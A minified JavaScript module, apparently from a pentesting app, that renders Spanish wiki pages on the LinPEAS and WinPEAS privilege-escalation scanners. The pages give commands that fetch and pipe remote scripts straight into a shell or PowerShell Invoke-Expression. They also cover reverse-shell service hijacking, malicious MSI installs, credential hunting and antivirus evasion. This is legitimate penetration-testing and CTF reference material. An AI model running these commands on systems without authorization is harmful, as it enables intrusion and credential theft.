import{t as e}from"./index-D1ybLGbB.js";var t=`# LinPEAS - Linux Privilege Escalation Awesome Script

LinPEAS es un script extremadamente completo que busca posibles rutas de escalada de privilegios en sistemas Linux/Unix. Busca configuraciones incorrectas, archivos con SUID, contraseñas en texto claro, y vulnerabilidades conocidas.

## Leyenda de Colores (IMPORTANTE)

- **<span style="color:#ff5252; font-weight:bold">Rojo sobre Amarillo</span>**: 99% de probabilidad de ser un vector de escalada de privilegios (¡Revisa esto primero!).
- **<span style="color:#ff5252">Rojo</span>**: Tienes que echarle un vistazo, es algo interesante pero no seguro.
- **<span style="color:#a5d6ff">Azul Celeste</span>**: Algunos usuarios con privilegios, software vulnerable, o configuraciones útiles.
- **<span style="color:#7ee787">Verde</span>**: Configuraciones normales o seguras.

## Ejecución Rápida

### Descargar y Ejecutar Directamente (Desde memoria)
\`\`\`bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
\`\`\`
### Si no tienes curl (Con Wget)
\`\`\`bash
wget -qO- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
\`\`\`

### Opciones Interesantes
- \`-a\`: Búsqueda extensa (All). Realizará pruebas más intensas pero puede tomar mucho más tiempo.
- \`-o <seccion>\`: Ejecutar solo un chequeo específico (ej: \`-o system_information,software\`).

## Secciones a Revisar con Lupa
1. **System Information**: ¿Hay exploits de kernel conocidos? (Ej: DirtyCow, PwnKit).
2. **Cron Jobs**: ¿Hay tareas programadas ejecutando scripts como root a los que tengas permisos de escritura?
3. **SUID Binaries**: Archivos con permisos SUID. ¡Busca estos binarios en GTFOBins!
4. **Sudo (sudo -l)**: Comandos que puedes ejecutar como root sin contraseña.
5. **Passwords & SSH Keys**: Búsqueda en archivos de historial (\`.bash_history\`), archivos de configuración, y memoria buscando contraseñas.
6. **Capabilities**: (Ej: \`cap_setuid\`) Muy similares a los SUID.
7. **NFS Exports**: Directorios exportados con \`no_root_squash\`.

*Siempre redirige la salida si es muy larga: \`./linpeas.sh | tee linpeas_output.txt\`.*

## Búsquedas Específicas
A veces no quieres que LinPEAS corra durante 10 minutos. Puedes invocar funciones específicas si ya descargaste el script:

\`\`\`bash
# Solo buscar archivos con SUID y Capabilities
./linpeas.sh -o suid,capabilities

# Solo buscar contraseñas guardadas y archivos de configuración sensibles
./linpeas.sh -o passwords,software

# Solo revisar contenedores (Docker/LXC) y montajes
./linpeas.sh -o containers,mounts
\`\`\`

## Tips Pro
- Si el servidor tiene mucha carga (uso de CPU al 100%), LinPEAS puede llegar a colgar el servicio de producción. En entornos reales (fuera de CTF), usa la opción \`superfast\` o lanza comandos manuales.
- Fíjate siempre en la sección de **"Software Information"**. A veces un binario extraño o una versión obsoleta de Apache/Nginx con exploit público es el camino más fácil.
- Revisa los puertos internos que LinPEAS detecta escuchando en \`127.0.0.1\`. A menudo hay servicios vulnerables corriendo localmente que no eran accesibles desde fuera.
`,n='# WinPEAS - Windows Privilege Escalation Awesome Script\n\nWinPEAS es el equivalente a LinPEAS pero para entornos Windows. Busca vectores de escalada de privilegios analizando servicios, registros, permisos de archivos, contraseñas guardadas en la caché, y configuraciones de Active Directory locales.\n\n## Leyenda de Colores (IMPORTANTE)\n\n- **<span style="color:#ff5252; font-weight:bold">Rojo sobre Amarillo</span>**: 99% de probabilidad de ser un vector de escalada de privilegios (¡Vulnerabilidad Crítica!).\n- **<span style="color:#ff5252">Rojo</span>**: Tienes que investigar esto más a fondo. Puede ser información sensible o un vector real.\n- **<span style="color:#a5d6ff">Azul Celeste</span>**: Información sobre el sistema y configuraciones generales (Usuarios, Grupos, Permisos estándar).\n- **<span style="color:#7ee787">Verde</span>**: Configuraciones seguras.\n\n## Ejecución Rápida\n\n### Ejecutable (CMD/Powershell)\nDescarga `winPEASany.exe` desde GitHub y ejecútalo directamente:\n```cmd\nwinPEASany.exe\n```\n\n### Versión PowerShell (Sin tocar el disco duro)\nSi tienes ejecución de código pero no puedes subir binarios:\n```powershell\n$wp=[System.Net.WebClient]::new().DownloadString(\'https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1\'); Invoke-Expression $wp; Invoke-winPEAS\n```\n\n### Opciones Interesantes (Modo Binario)\n- `cmd`: Búsquedas extra usando comandos nativos de Windows.\n- `fast`: Omite búsquedas pesadas (como buscar contraseñas recursivamente en el disco).\n- `domain`: Busca información extra de Active Directory.\n\n## Secciones Críticas a Revisar\n1. **System Information**: Revisa la versión del OS (¿Es vulnerable a PrintNightmare, PetitPotam, etc?).\n2. **Users Information**: Revisa si tu usuario tiene el privilegio `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` (Vector para Potato Exploits como JuicyPotato/PrintSpoofer).\n3. **Services (Modifiable Services)**: Servicios en los que tienes permisos para cambiar el `binPath` (la ruta del ejecutable). Puedes reemplazarlo por una reverse shell y reiniciar el servicio (usando `sc.exe`).\n4. **Unquoted Service Paths**: Servicios cuya ruta no está entre comillas y tiene espacios (Ej: `C:\\Program Files\\App\\app.exe`). Puedes crear un ejecutable en `C:\\Program.exe`.\n5. **AlwaysInstallElevated**: Si el registro marca esto en `1`, puedes crear un archivo `.msi` malicioso que se instalará como SYSTEM.\n6. **AutoLogon / Credential Manager**: Contraseñas guardadas en texto claro en el registro o credenciales almacenadas en caché.\n7. **SAM / SYSTEM Files**: Copias de seguridad de las bases de datos de contraseñas de Windows almacenadas en carpetas accesibles (Ej: `C:\\Windows\\Repair\\`).\n\n## Errores Comunes de WinPEAS\n- **Demasiada Salida**: WinPEAS puede generar miles de líneas de salida si el servidor tiene muchos archivos. Trata de redirigir la salida a un archivo para leerlo con calma:\n  ```cmd\n  winPEASany.exe > C:\\Temp\\winpeas_out.txt\n  ```\n- **Falsos Positivos**: El color "Rojo" normal (no el rojo sobre amarillo) a menudo señala configuraciones predeterminadas de Windows que técnicamente son inseguras pero no son explotables directamente sin otra pieza del rompecabezas. Enfócate siempre en el Rojo sobre Amarillo primero.\n- **Bloqueo por Antivirus**: Windows Defender flaggea a WinPEAS casi siempre. Si estás en un entorno con AV, usa la versión `winPEAS.bat` (batch script) que evade algunas detecciones básicas, o lanza comandos manuales como `whoami /priv` o `sc qc <servicio>`.\n',r={renderSidebar(r,i){let a=i===`linpeas`?t:n;r.innerHTML=`
      <div class="peas-wiki-container" style="padding: 10px; overflow-y: auto; height: 100%; color: var(--text-primary); font-family: sans-serif; line-height: 1.5;">
        ${e.parse(a)}
      </div>
    `;let o=r.querySelector(`.peas-wiki-container`);o.querySelectorAll(`h1, h2, h3`).forEach(e=>{e.style.marginTop=`15px`,e.style.marginBottom=`10px`,e.style.borderBottom=e.tagName===`H1`||e.tagName===`H2`?`1px solid var(--border-color)`:`none`,e.style.paddingBottom=`5px`}),o.querySelectorAll(`pre`).forEach(e=>{e.style.background=`#0d1117`,e.style.color=`#c9d1d9`,e.style.padding=`10px`,e.style.borderRadius=`5px`,e.style.overflowX=`auto`,e.style.fontSize=`0.85em`}),o.querySelectorAll(`code`).forEach(e=>{e.parentElement.tagName!==`PRE`&&(e.style.background=`var(--bg-active)`,e.style.padding=`2px 4px`,e.style.borderRadius=`3px`,e.style.fontSize=`0.9em`)}),o.querySelectorAll(`ul, ol`).forEach(e=>{e.style.paddingLeft=`20px`,e.style.marginBottom=`15px`})}};export{r as PeasWiki};